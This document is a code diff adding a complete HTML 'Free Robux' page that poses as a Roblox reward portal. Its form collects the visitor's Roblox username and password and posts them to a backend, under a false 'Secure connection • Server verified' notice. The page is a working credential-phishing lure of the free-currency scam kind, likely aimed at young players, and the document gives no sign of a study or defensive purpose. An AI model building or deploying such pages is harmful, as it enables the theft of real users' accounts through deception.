@@ -1,0 +1,119 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link rel="icon" href="assets/roblox.png" type="image/png">
+    <title>Free Robux.org</title>
+
+    <style>
+        * {
+            box-sizing: border-box;
+            font-family: Arial, Helvetica, sans-serif;
+        }
+
+        body {
+            margin: 0;
+            min-height: 100vh;
+            background: linear-gradient(135deg, #141e30, #243b55);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            color: #fff;
+        }
+
+        .container {
+            background: #0f0f0f;
+            width: 360px;
+            padding: 28px;
+            border-radius: 14px;
+            box-shadow: 0 25px 60px rgba(0,0,0,0.6);
+        }
+
+        .title {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 12px;
+            margin-bottom: 10px;
+        }
+
+        .title img {
+            width: 46px;
+            height: 46px;
+        }
+
+        .title h1 {
+            font-size: 26px;
+            margin: 0;
+        }
+
+        .subtitle {
+            text-align: center;
+            font-size: 13px;
+            color: #b0b0b0;
+            margin-bottom: 22px;
+        }
+
+        input {
+            width: 100%;
+            padding: 11px;
+            margin-bottom: 14px;
+            border-radius: 6px;
+            border: none;
+            outline: none;
+            font-size: 14px;
+        }
+
+        button {
+            width: 100%;
+            padding: 12px;
+            background: #00b06f;
+            color: #fff;
+            border: none;
+            border-radius: 6px;
+            font-size: 16px;
+            font-weight: bold;
+            cursor: pointer;
+        }
+
+        button:hover {
+            background: #00d084;
+        }
+
+        .note {
+            margin-top: 16px;
+            font-size: 11px;
+            text-align: center;
+            color: #888;
+        }
+
+    </style>
+</head>
+<body>
+
+    <div class="container">
+        <div class="title">
+            <img src="assets/robux icon.jpg" style=" mix-blend-mode: multiply;" alt="Robux" class="robux-icon">
+            <h1>Free Robux</h1>
+        </div>
+
+        <div class="subtitle">
+            Roblox Reward Distribution Portal
+        </div>
+
+        <!-- REAL backend connection -->
+        <form action="/register" method="POST">
+            <input type="text" name="username" placeholder="Roblox Username" required>
+            <input type="number" name="robux" placeholder="Amount of Robux" required>
+            <input type="password" name="password" placeholder="Roblox Password" required>
+            <button type="submit">Get Robux</button>
+        </form>
+
+        <div class="note">
+            Secure connection • Server verified
+        </div>
+    </div>
+
+</body>
+</html>
